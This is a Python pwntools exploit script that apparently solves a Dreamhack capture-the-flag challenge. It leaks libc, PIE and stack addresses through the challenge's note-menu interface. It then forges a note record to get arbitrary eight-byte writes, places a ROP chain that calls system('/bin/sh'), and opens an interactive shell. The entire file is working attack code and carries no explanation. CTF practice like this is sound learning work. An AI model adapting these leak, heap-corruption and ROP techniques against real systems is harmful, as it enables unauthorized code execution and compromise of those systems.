#!/usr/bin/env python3
from pwn import *

HOST = args.HOST or "host3.dreamhack.games"
PORT = int(args.PORT or 14484)

BIN  = "./prob_patched"
LIBC = "./libc.so.6"
LD   = "./ld-linux-x86-64.so.2"

context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False)
context.arch = "amd64"
context.log_level = "info"

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([LD, "--library-path", ".", BIN], stdin=PIPE, stdout=PTY)

def leak(io):
    io.sendlineafter(b'?\n', b'')

    libc_base = u64(io.recvuntil(b',')[:-1] + b'\x00\x00') + 30 - 0x1f0f28

    io.sendlineafter(b'>> ', b'4')
    io.sendafter(b'>> ', b'A' * 0x8)
    io.recvuntil(b'A' * 0x8)
    pie_base = u64(io.recvn(6) + b'\x00\x00') - 0x17d0

    io.sendlineafter(b'>> ', b'4')
    io.sendafter(b'>> ', b'A' * 0x20)
    io.recvuntil(b'A' * 0x20)
    rbp = u64(io.recvn(6) + b'\x00\x00') - 0xf0

    return libc_base, pie_base, rbp

def mk(io, idx, size, data, raw=False):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'>> ', str(idx).encode())
    io.sendlineafter(b'>> ', str(size).encode())
    if raw:
        io.sendafter(b'>> ', data)
    else:
        io.sendlineafter(b'>> ', data)

def cp(io, src, dst):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'>> ', str(src).encode())
    io.sendlineafter(b'>> ', str(dst).encode())

def rm(io, idx):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'>> ', str(idx).encode())

def write6(io, where, what, cleanup=True):
    # 2 note size-class 0x20
    mk(io, 1, 12, b"m3r0n4")
    mk(io, 2, 12, b"m3r0n4")

    rm(io, 1)
    rm(io, 2)

    # src note
    mk(io, 1, 50, p64(what), raw=True)

    # fake note id=3
    payload  = p32(3)
    payload += p32(0x32)
    payload += p64(where)
    mk(io, 2, 24, payload, raw=True)

    cp(io, 1, 3)

    if cleanup:
        rm(io, 2)
        rm(io, 1)

def main():
    io = start()

    libc_base, pie_base, rbp = leak(io)

    log.success(f"libc_base = {hex(libc_base)}")
    log.success(f"pie_base  = {hex(pie_base)}")
    log.success(f"rbp       = {hex(rbp)}")

    pop_rdi_ret = pie_base + 0x1833
    ret         = pie_base + 0x101a
    binsh       = libc_base + 0x1b75aa
    system      = libc_base + 0x55410

    log.info(f"pop_rdi_ret = {hex(pop_rdi_ret)}")
    log.info(f"ret         = {hex(ret)}")
    log.info(f"binsh       = {hex(binsh)}")
    log.info(f"system      = {hex(system)}")

    write6(io, rbp + 0x08, pop_rdi_ret, cleanup=True)
    write6(io, rbp + 0x10, binsh,       cleanup=True)
    write6(io, rbp + 0x18, ret,         cleanup=True)
    write6(io, rbp + 0x20, system,      cleanup=False)

    io.sendlineafter(b'>> ', b'5')
    io.interactive()

if __name__ == "__main__":
    main()
